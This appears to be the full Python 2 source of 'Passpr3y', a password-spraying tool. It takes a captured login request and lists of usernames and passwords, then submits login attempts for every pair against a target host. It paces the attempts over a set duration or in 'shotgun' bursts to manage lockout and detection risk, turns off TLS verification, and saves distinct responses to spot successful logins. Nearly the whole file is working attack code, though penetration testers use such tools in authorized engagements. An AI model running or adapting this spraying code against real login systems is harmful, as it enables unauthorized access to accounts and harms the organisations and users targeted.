#!/usr/bin/python

# This program comes with no promises, warranties, or apologies. 
# Use at your own risk and responsibility.

import argparse
import requests
import os
import sys
import time
import hashlib
import random
import string

# Get rid of dem warnings, this a gottam hak tool
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Console colors
G = '\033[92m'  # green
Y = '\033[93m'  # yellow
B = '\033[94m'  # blue
R = '\033[91m'  # red
W = '\033[0m'   # white

class Passpr3y:
    def __init__(self, requestFile, usernameFile, passwordFile, duration=7200, ssl=False, shotgun=False):
        self.requestFile = requestFile
        self.usernameFile = usernameFile
        self.passwordFile = passwordFile
        self.duration = duration
        self.ssl = ssl
        self.shotgun = shotgun

        # Create log directory
        if not os.path.exists("logs"):
            os.makedirs("logs")

        # Parse request file
        requestFile = open(self.requestFile, 'r')
        lineList = requestFile.readlines()
        self.endPoint = lineList[0].split(' ')[1].strip()
        self.headerDict = dict(item.split(': ') for item in map(str.strip, lineList[1:-2]))
        self.dataDict = dict(item.split('=') for item in map(str.strip, lineList[-1].split('&')))
        requestFile.close()
        if("USERPR3Y" not in self.dataDict.values() or "PASSPR3Y" not in self.dataDict.values()):
            sys.exit("Error: USERPR3Y or PASSPR3Y not present in POST request parameters.")

        # Parse usernames file
        usernameFileHandle = open(self.usernameFile, 'r')
        self.usernameList = map(str.strip, usernameFileHandle.readlines())
        usernameFileHandle.close()

        # Parse passwords file
        passwordFileHandle = open(self.passwordFile, 'r')
        self.passwordList = map(str.strip, passwordFileHandle.readlines())
        passwordFileHandle.close()

        # Figure out time intervals
        self.shotgunSleepTime = int(self.duration)
        self.slowSleepTime = float(self.shotgunSleepTime)/float(len(self.usernameList))

        # Get injection points
        for key,value in self.dataDict.iteritems():
            if value == "USERPR3Y":
                self.usernameKey = key
            elif value == "PASSPR3Y":
                self.passwordKey = key
    
    def showWarning(self):
        # Ensure spray time is appropriate
        if(not self.shotgun):
            if raw_input("You will be spraying against " + str(len(self.usernameList)) + " users over the course of " + str(self.shotgunSleepTime) + " seconds.\nThere is a " + str(self.slowSleepTime) + " second wait between each user attempt.\nIs that cool? (y/N) ").lower() != 'y':
                sys.exit("Change spray time.")

        else:
            if raw_input("You've selected the shotgun method.\nThis will spray ALL users without pausing between each user.\nAfter spraying ALL users, there is a " + str(self.shotgunSleepTime) + " second wait. Opsec is questionable.\nIs that cool? (y/N) ").lower() != 'y':
                sys.exit("Don't set shotgun flag.")

    def performTest(self):
        randomUser = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
        randomPass = ''.join(random.choice(string.ascii_lowercase) for _ in range(12))
        print "%sPerforming test request to benchmark failed attempt...%s" % (Y,W)
        response = self.performRequest(randomUser, randomPass)
        if(response.status_code == 400):
            print "%sTest request returned status code " % (R) + str(response.status_code) + "%s" % (W)
            if(raw_input("Are you sure you want to continue? (y/N) ") != 'y'):
                sys.exit("Unsatisfactory response HTTP code.")
        else:
            print "%sTest request did not return 400, moving on.%s\n" % (G,W)

    def performSpray(self, duration=7200, shotgun=False, ssl=True):
        # Spray
        for password in self.passwordList:
            # Get time right before spray
            date = time.strftime("%m.%d.%Y", time.localtime())
            tyme = time.strftime("%H:%M:%S", time.localtime())
            responseDict = {}

            print "Password " + str(self.passwordList.index(password) + 1) + " of " + str(len(self.passwordList))

            # Perform spray
            for username in self.usernameList:
                response = self.performRequest(username, password)

                # Create hash of response
                checksummer = hashlib.md5()
                checksummer.update(response.content)

                # Store hash of response. Chance of collision but very minimal.
                responseDict[checksummer.hexdigest()] = response

                if(not self.shotgun and (password != self.passwordList[-1] or username != self.usernameList[-1])):
                    time.sleep(self.slowSleepTime)

            # Indicate number of unique responses (still basic approach)
            print "\t\tUnique responses: " + str(len(responseDict))

            # Create file
            if not os.path.exists("logs/" + date):
                os.makedirs("logs/" + date)
            if not os.path.exists("logs/" + date + '/' + tyme):
                os.makedirs("logs/" + date + '/' + tyme)

            # Write to file. Files are named with hashes that distinguish between unique responses.
            for key,value in responseDict.iteritems():
                fileOut = open("logs/" + date + '/' + tyme + '/' + key + ".html", 'w')

                # Log request. If there were redirects, log the very first request made.
                fileOut.write('-'*80 + '\n')
                fileOut.write("REQUEST")
                fileOut.write('\n' + '-'*80 + '\n')

                requestToLog = requests.Request()
                if(value.history):
                    requestToLog = value.history[0].request
                else:
                    requestToLog = value.request

                fileOut.write(str(requestToLog.url) + '\n\n')
                for k2,v2 in requestToLog.headers.iteritems():
                    fileOut.write(k2 + ": " + v2 + '\n')
                fileOut.write('\n' + str(requestToLog.body) + '\n')

                fileOut.write('\n' + '-'*80 + '\n')
                fileOut.write("RESPONSE")
                fileOut.write('\n' + '-'*80 + '\n')

                # Log response
                fileOut.write(str(value.status_code) + ' ' + value.reason + '\n')
                for k2,v2 in value.headers.iteritems():
                    fileOut.write(k2 + ": " + v2 + '\n')
                fileOut.write('\n' + value.text)

                fileOut.close()

            if(self.shotgun and password is not self.passwordList[-1]):
                time.sleep(self.shotgunSleepTime)

    def performRequest(self, username, password):
        # Load injection points
        self.dataDict[self.usernameKey] = username
        self.dataDict[self.passwordKey] = password
        
        # Attempt login
        print "\tAttempting " + username + ':' + password
        if(self.ssl):
            url = "https://" + self.headerDict["Host"] + self.endPoint
        else:
            url = "http://" + self.headerDict["Host"] + self.endPoint
        return requests.post(url=url, headers=self.headerDict, data=self.dataDict, verify=False)

if __name__ == '__main__':
    # Parse command line arguments
    parser = argparse.ArgumentParser()

    parser.add_argument("--request", default="request.txt", help="Name of request file. Default is 'request.txt'.")
    parser.add_argument("--usernames", default="usernames.txt", help="Name of usernames file. Default is 'usernames.txt'.")
    parser.add_argument("--passwords", default="passwords.txt", help="Name of passwords file. Default is 'passwords.txt'.")
    parser.add_argument("--duration", default="7200", help="Total spray duration in seconds. Default is 7200 seconds.")
    parser.add_argument("--ssl", action="store_true", help="Use https.")
    parser.add_argument("--shotgun", action="store_true", help="Spray all users with no pause.")
    parser.add_argument("--proxy", help="Specify proxy. Format: 'http://127.0.0.1:8080'")

    args = parser.parse_args()

    programheader = """
    __________                      __________       ________
    \______   \_____    ______ _____\______   \______\_____  \___.__.
     |     ___/\__  \  /  ___//  ___/|     ___/\_  __ \_(__  <   |  |
     |    |     / __ \_\___ \ \___ \ |    |     |  | \%s/       \___  |
     |____|    (____  /____  >____  >|____|     |__| /______  / ____|
                    \/     \/     \/                        \/\/

    %s\tBrought to you by Faisal Tameesh (%s@DreadSystems%s)
    \tShoutout to the folks at %s@DepthSecurity%s
    """%(R,W,R,W,B,W)

    print "\n" + "-"*73
    print programheader
    print "-"*73 + "\n"

    pr3y = Passpr3y(requestFile=args.request, \
            usernameFile=args.usernames, \
            passwordFile=args.passwords, \
            duration=args.duration, \
            shotgun=args.shotgun, \
            ssl=args.ssl)

    pr3y.showWarning()

    pr3y.performTest()

    pr3y.performSpray()
